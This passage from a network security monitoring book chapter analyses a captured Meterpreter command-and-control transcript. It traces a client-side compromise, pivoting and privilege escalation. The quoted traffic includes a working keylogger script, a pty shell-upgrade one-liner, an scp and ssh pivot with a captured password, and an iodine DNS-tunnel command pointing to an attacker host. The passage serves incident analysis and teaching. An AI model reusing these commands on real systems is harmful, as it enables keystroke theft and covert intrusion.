  type: TYPE_NORMAL
- en: '![Image 143](index-284_1.png)'
  prefs: []
  type: TYPE_IMG
- en: '**examining the command-and-control channel**'
  prefs: []
  type: TYPE_NORMAL
- en: From our previous analysis, we know that the intruder pivoted from victim
  prefs: []
  type: TYPE_NORMAL
- en: 172.16.0.37 to 10.0.0.99, but we don’t know what he did on those two systems.
  prefs: []
  type: TYPE_NORMAL
- en: Perhaps the traffic involving port 4444 TCP holds the answer. This could
  prefs: []
  type: TYPE_NORMAL
- en: be the command-and-control channel, because it appears immediately after
  prefs: []
  type: TYPE_NORMAL
- en: the connections to the malicious website.
  prefs: []
  type: TYPE_NORMAL
- en: To analyze the suspected command-and-control channel, we generate
  prefs: []
  type: TYPE_NORMAL
- en: a transcript for port 4444 traffic using the CapMe feature in ELSA. Click
  prefs: []
  type: TYPE_NORMAL
- en: the **Info** button next to the record of interest involving port 4444 to get
    full content data. Figure 11-15 shows how to access CapMe.
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 11-15: Starting CapMe to generate a transcript for port 4444 traffic*'
  prefs: []
  type: TYPE_NORMAL
- en: Click the **getPcap** option, and then click **OK**, to display a new screen
  prefs: []
  type: TYPE_NORMAL
- en: where we input credentials to access the sensor. Also, for this example, I
  prefs: []
  type: TYPE_NORMAL
- en: needed to change the Sid Source entry from **sancp** to **event** to help CapMe
    find the right session. When I ran this query originally, CapMe did not find
  prefs: []
  type: TYPE_NORMAL
- en: the session with the Sid Source as sancp. The session record was probably
  prefs: []
  type: TYPE_NORMAL
- en: not loaded yet, so I used the event table to find the data of interest. This
  prefs: []
  type: TYPE_NORMAL
- en: approach works only if there is an event (triggered by Snort or Suricata,
  prefs: []
  type: TYPE_NORMAL
- en: for example) associated with the traffic. It’s safer to use the sancp table
  prefs: []
  type: TYPE_NORMAL
- en: as long as the records have been loaded. You may need to wait a few min-
  prefs: []
  type: TYPE_NORMAL
- en: utes for the records to load. Figure 11-16 shows the CapMe data request
  prefs: []
  type: TYPE_NORMAL
- en: interface.
  prefs: []
  type: TYPE_NORMAL
- en: In this section, we will examine the resulting transcript. At 642KB, it’s
  prefs: []
  type: TYPE_NORMAL
- en: quite large, and manually examining it for entries of interest is tedious,
  prefs: []
  type: TYPE_NORMAL
- en: but doing so is our best way to determine what happened to the victim
  prefs: []
  type: TYPE_NORMAL
- en: systems. We’ll look at excerpts from the transcript and what is happening
  prefs: []
  type: TYPE_NORMAL
- en: at each point.
  prefs: []
  type: TYPE_NORMAL
- en: '**250** Chapter 11'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '![Image 144](index-285_1.jpg)'
  prefs: []
  type: TYPE_IMG
- en: '*Figure 11-16: Configuring CapMe to retrieve a transcript for*'
  prefs: []
  type: TYPE_NORMAL
- en: '*port 4444 traffic*'
  prefs: []
  type: TYPE_NORMAL
- en: '***Initial Access***'
  prefs: []
  type: TYPE_NORMAL
- en: The transcript begins with the standard header created by Sguil (which
  prefs: []
  type: TYPE_NORMAL
- en: handles transcript creation for CapMe, in the background) as shown in
  prefs: []
  type: TYPE_NORMAL
- en: Listing 11-7\. The command-and-control channel is not a cleartext-based
  prefs: []
  type: TYPE_NORMAL
- en: exchange as in previous examples, so be prepared for a lot of extraneous
  prefs: []
  type: TYPE_NORMAL
- en: characters!
  prefs: []
  type: TYPE_NORMAL
- en: 'Sensor Name: sovm-eth1-1'
  prefs: []
  type: TYPE_NORMAL
- en: 'Timestamp: 2013-03-16 14:17:57'
  prefs: []
  type: TYPE_NORMAL
- en: 'Connection ID: .sovm-eth1-1_210'
  prefs: []
  type: TYPE_NORMAL
- en: 'Src IP: 172.16.0.37 (Unknown)'
  prefs: []
  type: TYPE_NORMAL
- en: 'Dst IP: 203.0.113.15 (Unknown)'
  prefs: []
  type: TYPE_NORMAL
- en: 'Src Port: 54056'
  prefs: []
  type: TYPE_NORMAL
- en: 'Dst Port: 4444'
  prefs: []
  type: TYPE_NORMAL
- en: 'OS Fingerprint: 172.16.0.37:54056 - UNKNOWN [S10:64:1:60:M1460,S,T,N,W6:.:?:?]
    (up: 4 hrs) OS Fingerprint: -> 203.0.113.15:4444 (link: ethernet/modem)'
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: ...........-.'
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: .........start..E(Ljava/io/DataInputStream;Ljava/io/OutputStream;[Ljava/lang/String;)V..'
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 11-7: Standard transcript header created by Sguil*'
  prefs: []
  type: TYPE_NORMAL
- en: Next, the term meterpreter appears, as shown in Listing 11-8\. We’ve already
  prefs: []
  type: TYPE_NORMAL
- en: seen this in the Snort alerts, but the presence of the term here indicates we’re
  prefs: []
  type: TYPE_NORMAL
- en: dealing with a Meterpreter component of the Metasploit framework.
  prefs: []
  type: TYPE_NORMAL
- en: Client-side Compromise **251**
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: java/util/Map.......7com/metasploit/**meterpreter**/MemoryBufferURLStreamHandler.............'
  prefs: []
  type: TYPE_NORMAL
- en: getFiles...java/lang/Class........java/lang/Object.....
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 11-8: The meterpreter reference*'
  prefs: []
  type: TYPE_NORMAL
- en: As shown in Listing 11-9, next we see the term sysinfo, followed by
  prefs: []
  type: TYPE_NORMAL
- en: what might be a hostname, wirubu32, and a Linux kernel version, Linux
  prefs: []
  type: TYPE_NORMAL
- en: 3.5.0-25-generic (i386). The victim system appears to be a Linux i386
  prefs: []
  type: TYPE_NORMAL
- en: platform.
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: .........."....stdapi_sys_config_**sysinfo**....)....53495413969516947426070095319226.........'
  prefs: []
  type: TYPE_NORMAL
- en: '**wirubu32**....&.... **Linux 3.5.0-25-generic (i386)**.............'
  prefs: []
  type: TYPE_NORMAL
- en: 'DST:'
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 11-9: System information*'
  prefs: []
  type: TYPE_NORMAL
- en: Next, we see the term desktop_screenshot, as shown in Listing 11-10,
  prefs: []
  type: TYPE_NORMAL
- en: which is certainly suspicious. This is probably a command to acquire a
  prefs: []
  type: TYPE_NORMAL
- en: screen capture of the victim’s desktop.
  prefs: []
  type: TYPE_NORMAL
- en: ..Ji.......%....stdapi_ui_**desktop_screenshot**....)....53921668623768997177532920965755..........
  prefs: []
  type: TYPE_NORMAL
- en: ..2..I. .....j.x...}|T..0|&s..0..t.AS.u.`.F..I'..2.Q&..k&..`.4M)R.AZ'.....v.i.Gm...../
  prefs: []
  type: TYPE_NORMAL
- en: '[...V..@...@.Q...WO..X.......g...{.{..{.ym..g.}.^{.'
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 11-10: The desktop_screenshot command for getting screen captures*'
  prefs: []
  type: TYPE_NORMAL
- en: This second appearance of a desktop_screenshot command is followed
  prefs: []
  type: TYPE_NORMAL
- en: by a JFIF string, as shown in Listing 11-11\. This is probably the header for
  prefs: []
  type: TYPE_NORMAL
- en: a JPEG File Interchange Format ( JFIF) file.
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: ..........%....stdapi_ui_**desktop_screenshot**....)....53921668623768997177532920965755..'
  prefs: []
  type: TYPE_NORMAL
- en: ..w.......... **JFIF**.............C......
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 11-11: JFIF reference*'
  prefs: []
  type: TYPE_NORMAL
- en: The excerpt in Listing 11-12 shows the net_config_get_interfaces and
  prefs: []
  type: TYPE_NORMAL
- en: net_config_get_routes functions. The intruder is probably listing network
  prefs: []
  type: TYPE_NORMAL
- en: interfaces and routes on the victim system to see where he sits on the
  prefs: []
  type: TYPE_NORMAL
- en: network.
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: ...Z.......)....stdapi_net_config_get_interfaces....)....90005067652712330016895656875088\.'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: .'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: ..j.......)....stdapi_**net_config_get_interfaces**....)....90005067652712330016895656875088..'
  prefs: []
  type: TYPE_NORMAL
- en: '...............@..........|...........z....................eth0 -'
  prefs: []
  type: TYPE_NORMAL
- en: eth0...................)..8.............@.......................%...........
  prefs: []
  type: TYPE_NORMAL
- en: '.....@..........|...........z..@4................lo - lo.......................................'
  prefs: []
  type: TYPE_NORMAL
- en: '..................................'
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: ...V.......%....stdapi_net_config_get_routes....)....34295947967733618834188710122897\.'
  prefs: []
  type: TYPE_NORMAL
- en: '**252** Chapter 11'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: .'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: ..Z.......%....stdapi_**net_config_get_routes**....)....34295947967733618834188710122897.....'
  prefs: []
  type: TYPE_NORMAL
- en: '...........P@.....................)..8.....................................................,@'
  prefs: []
  type: TYPE_NORMAL
- en: '..............'
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 11-12: The net_config_get_interfaces and net_config_get_routes functions*'
  prefs: []
  type: TYPE_NORMAL
- en: The getwd command in Listing 11-13 probably means to get the working
  prefs: []
  type: TYPE_NORMAL
- en: directory, followed by a mention of the */home/ubu32* directory.
  prefs: []
  type: TYPE_NORMAL
- en: '%...........................P@......'
  prefs: []
  type: TYPE_NORMAL
- en: '........................................................................,@.....................'
  prefs: []
  type: TYPE_NORMAL
- en: '..................'
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: ...I............stdapi_fs_**getwd**....)....55282344159994215019998291531526\.'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: .'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: ..i............stdapi_fs_getwd....)....55282344159994215019998291531526.........
    **/home/**'
  prefs: []
  type: TYPE_NORMAL
- en: '**ubu32**.............'
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 11-13: The getwd command and* /home/ubu32 *reference*'
  prefs: []
  type: TYPE_NORMAL
- en: Listing 11-14 shows the most interesting entry so far. The string keylog
  prefs: []
  type: TYPE_NORMAL
- en: .sh indicates that a keylogger is involved. If the intruder can capture keystrokes
  prefs: []
  type: TYPE_NORMAL
- en: on the victim, he can access all sorts of information and potentially other
  prefs: []
  type: TYPE_NORMAL
- en: systems. Following the name of the script appears to be the script itself, as
  prefs: []
  type: TYPE_NORMAL
- en: 'well as the name of the file used to save the logged keystrokes: */tmp/.xkey.log*.'
  prefs: []
  type: TYPE_NORMAL
- en: With this information, we could look for the file on the victim hard drive,
  prefs: []
  type: TYPE_NORMAL
- en: assuming the intruder didn’t delete it or the system didn’t remove it after
  prefs: []
  type: TYPE_NORMAL
- en: rebooting.
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: ................core_channel_open....)....64467327797845790259721795802753........3std
    api_fs_file........6........................ **keylog.sh**.........wbb.'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: .'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: ..c............core_channel_open....)....64467327797845790259721795802753........2.......'
  prefs: []
  type: TYPE_NORMAL
- en: '.........'
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: ................core_channel_write....)....05544054210663822153934887650143........2.....'
  prefs: []
  type: TYPE_NORMAL
- en: ..X...4#!/bin/bash
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: export DISPLAY=:0.0'
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: xinput list'
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: echo -e "KBD ID ?"'
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: read kbd'
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: xmodmap -pke > **/tmp/.xkey.log**'
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: script -c "xinput test $kbd" | cat >> /**tmp/.xkey.log** & DST: echo "The
    keylog can be downloaded from **/tmp/.xkey.log**"'
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: echo "Use the meterpreter download function"'
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: echo "Press CTLR+C to exit this session, **keylogger will run in background**"'
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 11-14: Keylogger references*'
  prefs: []
  type: TYPE_NORMAL
- en: The intruder appears to run an ls -al command next. (Listing 11-15
  prefs: []
  type: TYPE_NORMAL
- en: shows only part of the output, although all of it was present in the transcript.)
  prefs: []
  type: TYPE_NORMAL
- en: Client-side Compromise **253**
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: ...s............core_channel_write....)....27069574503151630704223424155348........2......'
  prefs: []
  type: TYPE_NORMAL
- en: '.....4**ls -al**'
  prefs: []
  type: TYPE_NORMAL
- en: '**DST:** ............'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: .'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: ..d............core_channel_write....)....27069574503151630704223424155348...............'
  prefs: []
  type: TYPE_NORMAL
- en: '..........'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: .'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: ..............2.......W...4total 164'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: drwxr-xr-x 24 ubu32 ubu32 4096 Mar 16 10:22 .'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: drwxr-xr-x 3 root root 4096 Mar 8 21:00 ..'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: -rw------- 1 ubu32 ubu32 4447 Mar 16 08:17 .bash_history'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: -rw-r--r-- 1 ubu32 ubu32 220 Mar 8 21:00 .bash_logout'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: -rw-r--r-- 1 ubu32 ubu32 3486 Mar 8 21:00 .bashrc'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: drwx------ 15 ubu32 ubu32 4096 Mar 16 06:29 .cache'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: drwxrwxr-x 3 ubu32 ubu32 4096 Mar 15 08:52 .compiz-1'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: drwx------ 11 ubu32 ubu32 4096 Mar 16 09:34 .config'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: drwx------ 3 ubu32 ubu32 4096 Mar 8 21:34 .dbus'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: drwxr-xr-x 2 ubu32 ubu32 4096 Mar 8 21:34 Desktop'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: -rw-r--r-- 1 ubu32 ubu32 26 Mar 16 09:08 .dmrc'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: drwxr-xr-x 2 ubu32 ubu32 4096 Mar 8 21:34 Documents'
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 11-15: An ls -al command*'
  prefs: []
  type: TYPE_NORMAL
- en: The next command, mv keylog.sh .pulse, shows the intruder moving his
  prefs: []
  type: TYPE_NORMAL
- en: keylogger script into the *.pulse* directory, as shown in Listing 11-16\. Next,
    he changes the user permissions to rwx, for read-write-execute.
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: ................core_channel_write....)....64553530986314682019983298603129........2......'
  prefs: []
  type: TYPE_NORMAL
- en: '.....4**mv keylog.sh .pulse**'
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: ................core_channel_write....)....60405588103478885840826252268236........2......'
  prefs: []
  type: TYPE_NORMAL
- en: '.....4chmod u=**rwx** keylog.sh'
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: ............'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: .'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: ..d............core_channel_write....)....60405588103478885840826252268236...............'
  prefs: []
  type: TYPE_NORMAL
- en: '..........'
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 11-16: The mv keylog.sh .pulse command and rxw permissions*'
  prefs: []
  type: TYPE_NORMAL
- en: Here, the intruder appears to execute his *keylog.sh* script. (The output of
  prefs: []
  type: TYPE_NORMAL
- en: the script follows in Listing 11-17.) This script gives the intruder a chance
    to
  prefs: []
  type: TYPE_NORMAL
- en: select the keyboard to monitor and reminds him to look in the */tmp/.xkey.log*
  prefs: []
  type: TYPE_NORMAL
- en: directory for results.
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: ...x............core_channel_write....)....75957044127671614064150081298305........2......'
  prefs: []
  type: TYPE_NORMAL
- en: '.....4\. **/keylog.sh**'
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: ............'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: .'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: ..d............core_channel_write....)....75957044127671614064150081298305...............'
  prefs: []
  type: TYPE_NORMAL
- en: '..........'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: .'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: ..............2...........4... Virtual core pointer .id=2.[master pointer
    (3)]'
  prefs: []
  type: TYPE_NORMAL
- en: '**254** Chapter 11'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: ... ... Virtual core XTEST pointer .id=4.[slave pointer (2)]'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: ... ... VMware VMware Virtual USB Mouse .id=7.[slave pointer (2)]'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: ... ... VMware VMware Virtual USB Mouse .id=8.[slave pointer (2)]'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: ... ... ImPS/2 Generic Wheel Mouse .id=10.[slave pointer (2)]'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: ... Virtual core keyboard .id=3.[master keyboard (2)]'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: ... Virtual core XTEST keyboard .id=5.[slave keyboard (3)]'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: ... Power Button .id=6.[slave keyboard (3)]'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: ... AT Translated Set 2 keyboard .id=9.[slave keyboard (3)]'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: ....................core_channel_write....)....SRREVPPXSOANPPYWFQHSVCNMFFBJBMMJ....u......'
  prefs: []
  type: TYPE_NORMAL
- en: '.....2...........4KBD ID ?'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: ....................core_channel_write....)....NBVSIORNAUEQNTEQFFFCJMHXSAEMNQNA.'
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: ...n............core_channel_write....)....45042497071271683260243072775318........2.....'
  prefs: []
  type: TYPE_NORMAL
- en: ..
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: ...49'
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: ............'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: .'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: ..d............core_channel_write....)....45042497071271683260243072775318...............'
  prefs: []
  type: TYPE_NORMAL
- en: '..........'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: .'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: ..............2...........4**The keylog can be downloaded from /tmp/.xkey.log**'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: Use the meterpreter download function'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: Press CTLR+C to exit this session, keylogger will run in backround'
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 11-17: The* keylog .sh *script and reminder*'
  prefs: []
  type: TYPE_NORMAL
- en: Next, we see evidence that the intruder transferred a file called
  prefs: []
  type: TYPE_NORMAL
- en: '*iodine_0.6.0~rc1-7_i386.deb* from 203.0.113.15 to 172.16.0.37, as shown in'
  prefs: []
  type: TYPE_NORMAL
- en: Listing 11-18\. This appears to be a Debian package of the Iodine covert
  prefs: []
  type: TYPE_NORMAL
- en: DNS tunnel tool. The intruder must have used this tool to create the tens
  prefs: []
  type: TYPE_NORMAL
- en: of thousands of unusual DNS entries discussed earlier.
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: ................core_channel_open....)....32392496134731212115385138997235........3std
    api_fs_file........6...................$.... **iodine_0.6.0~rc1-7_i386.deb**.........wbb.'
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 11-18: The* iodine_0 .6 .0~rc1-7_i386 .deb *reference*'
  prefs: []
  type: TYPE_NORMAL
- en: '***Improving the Shell***'
  prefs: []
  type: TYPE_NORMAL
- en: The next command is fascinating, as shown in Listing 11-19\. By running
  prefs: []
  type: TYPE_NORMAL
- en: python -c 'import pty;pty.spawn("/bin/bash")', the intruder improves the shell
    he is using on the victim system by starting a Bash shell. By using Python
  prefs: []
  type: TYPE_NORMAL
- en: to start a Bash shell, he creates a shell that can prompt the user and accept
  prefs: []
  type: TYPE_NORMAL
- en: replies. (When an intruder opens a shell with Meterpreter, he may not have
  prefs: []
  type: TYPE_NORMAL
- en: access that allows him to enter passwords when prompted. This is a problem
  prefs: []
  type: TYPE_NORMAL
- en: when trying to run sudo or answer any other command that prompts the user.)
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: ................core_channel_write....)....07078092619529470178701062926304........2......'
  prefs: []
  type: TYPE_NORMAL
- en: .6...4**python -c 'import pty;pty.spawn("/bin/bash")'**
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 11-19: Bash shell startup*'
  prefs: []
  type: TYPE_NORMAL
- en: Client-side Compromise **255**
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: Continuing through the transcript reveals the reason for the Bash shell.
  prefs: []
  type: TYPE_NORMAL
- en: The intruder uses scp, as shown in Listing 11-20, to transfer (via SSH) the
  prefs: []
  type: TYPE_NORMAL
- en: '*iodine_0.6.0~rc1-7_i386.deb* package from 172.16.0.37 to 10.0.0.99 as user
    ubu32\.'
  prefs: []
  type: TYPE_NORMAL
- en: How does the intruder have the password to log in to 10.0.0.99? He prob-
  prefs: []
  type: TYPE_NORMAL
- en: ably captured it with his keylogger.
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: ................core_channel_write....)....28332839019310295629231957979483........2......'
  prefs: []
  type: TYPE_NORMAL
- en: .=...4**scp** **iodine_0.6.0~rc1-7_i386.deb** **ubu32@10.0.0.99:/tmp**
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 11-20: Transfer of the* iodine_0 .6 .0~rc1-7_i386 .deb *package*'
  prefs: []
  type: TYPE_NORMAL
- en: '***Summarizing Stage 1***'
  prefs: []
  type: TYPE_NORMAL
- en: At this point, the intruder has taken several steps involving one victim sys-
  prefs: []
  type: TYPE_NORMAL
- en: tem, as summarized in Figure 11-17\. He enticed a user to click a malicious
  prefs: []
  type: TYPE_NORMAL
- en: link posted to Twitter. That link pointed to a URL involving 203.0.113.15,
  prefs: []
  type: TYPE_NORMAL
- en: and the victim 172.16.0.37 visited a web server on the intruder’s system.
  prefs: []
  type: TYPE_NORMAL
- en: That malicious web server offered code that exploited a vulnerable Java
  prefs: []
  type: TYPE_NORMAL
- en: instance on 172.16.0.37\. The payload delivered with the Java exploit caused
  prefs: []
  type: TYPE_NORMAL
- en: the victim to reach back again to 203.0.113.15 to retrieve more attack soft-
  prefs: []
  type: TYPE_NORMAL
- en: ware from the intruder.
  prefs: []
  type: TYPE_NORMAL
- en: 1\. Victim clicks on malicious URL on Twitter.
  prefs: []
  type: TYPE_NORMAL
- en: SOCIAL MEDIA OR OTHER COMMUNICATION
  prefs: []
  type: TYPE_NORMAL
- en: Victim
  prefs: []
  type: TYPE_NORMAL
- en: Twitter
  prefs: []
  type: TYPE_NORMAL
- en: 172.16.0.37
  prefs: []
  type: TYPE_NORMAL
- en: 2\. Victim web browser connects to
  prefs: []
  type: TYPE_NORMAL
- en: 203.0.113.15:8080/healthcarenews.
  prefs: []
  type: TYPE_NORMAL
- en: NETWORK CONNECTION
  prefs: []
  type: TYPE_NORMAL
- en: Intruder 1
  prefs: []
  type: TYPE_NORMAL
- en: Victim
  prefs: []
  type: TYPE_NORMAL
- en: 203.0.113.15
  prefs: []
  type: TYPE_NORMAL
- en: 172.16.0.37
  prefs: []
  type: TYPE_NORMAL
- en: 3\. Attack method exploits vulnerable Java
  prefs: []
  type: TYPE_NORMAL
- en: Exploited
  prefs: []
  type: TYPE_NORMAL
- en: software on victim system to execute code.
  prefs: []
  type: TYPE_NORMAL
- en: 4\. Malicious code causes victim to reach back to intruder
  prefs: []
  type: TYPE_NORMAL
- en: so intruder can retrieve more malicious software.
  prefs: []
  type: TYPE_NORMAL
- en: NETWORK CONNECTION
  prefs: []
  type: TYPE_NORMAL
- en: Intruder 1
  prefs: []
  type: TYPE_NORMAL
- en: Victim
  prefs: []
  type: TYPE_NORMAL
- en: 203.0.113.15
  prefs: []
  type: TYPE_NORMAL
- en: 172.16.0.37
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 11-17: A summary of stage 1 of the client-side compromise*'
  prefs: []
  type: TYPE_NORMAL
- en: '**256** Chapter 11'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '***Pivoting to a Second Victim***'
  prefs: []
  type: TYPE_NORMAL
- en: Next, as shown in Listing 11-21, it appears that the intruder is connecting
  prefs: []
  type: TYPE_NORMAL
- en: from the first victim, 172.16.0.37, via SSH as user ubu32 to a second victim,
  prefs: []
  type: TYPE_NORMAL
- en: 10.0.0.99\. This is followed by the login prompt on 10.0.0.99, another Linux
  prefs: []
  type: TYPE_NORMAL
- en: system that’s running the same kernel. It advertises itself as an Ubuntu
  prefs: []
  type: TYPE_NORMAL
- en: 12.0.4.2 LTS distribution.
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: ................core_channel_write....)....21495256091063571385331835436694........2......'
  prefs: []
  type: TYPE_NORMAL
- en: '.....4**ssh ubu32@10.0.0.99**'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: ..U...........2...........4**Welcome to Ubuntu 12.04.2 LTS** (GNU/Linux
    3.5.0-25-generic i686) SRC:'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: * Documentation: https://help.ubuntu.com/'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC:'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: 0 packages can be updated.'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: 0 updates are security updates.'
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 11-21: Ubuntu connection to another victim*'
  prefs: []
  type: TYPE_NORMAL
- en: By running sudo bash, as shown in Listing 11-22, the intruder escalates
  prefs: []
  type: TYPE_NORMAL
- en: his access to root privileges.
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: ...v............core_channel_write....)....29459743353766825927232004106327........2......'
  prefs: []
  type: TYPE_NORMAL
- en: '.....4sudo bash'
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: ...........'
  prefs: []
  type: TYPE_NORMAL
- en: 'DST:'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: .'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: ..d............core_channel_write....)....29459743353766825927232004106327............'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: ............'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: ...w...........2...........4**sudo bash**'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: ....................core_channel_write....)....UJUHVDEWIYIKWPCUMRTWODZUIDRXEMKG.'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: .'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: ..............2.......#...4[sudo] password for ubu32: ....................core_channel_'
  prefs: []
  type: TYPE_NORMAL
- en: write....)....JTCKKYYZSXEFTWGOEWDZKWHCOLJYUWZG.
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: ...v............core_channel_write....)....56755805437825017718244048581240........2......'
  prefs: []
  type: TYPE_NORMAL
- en: '.....4wonderubu'
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 11-22: Access escalation with sudo bash*'
  prefs: []
  type: TYPE_NORMAL
- en: '***Instal ing a Covert Tunnel***'
  prefs: []
  type: TYPE_NORMAL
- en: As root, the intruder now installs the Iodine DNS covert tunnel tool via
  prefs: []
  type: TYPE_NORMAL
- en: dpkg -i iodine_0.6.0~rc1-7_i386.deb, as shown in Listing 11-23\.
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: ................core_channel_write....)....64642638366982677090891088802167........2......'
  prefs: []
  type: TYPE_NORMAL
- en: .,...4**dpkg -i iodine_0.6.0~rc1-7_i386.deb**
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 11-23: Iodine DNS covert tunnel tool instal ation*'
  prefs: []
  type: TYPE_NORMAL
- en: Client-side Compromise **257**
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: Next, we see that the intruder starts the Iodine tool with the command iodine
    -r 203.0.113.8 practicalnsm.com, as shown in Listing 11-24\. He is starting the
    Iodine client, pointing it to a server at 203.0.113.8, with DNS traffic
  prefs: []
  type: TYPE_NORMAL
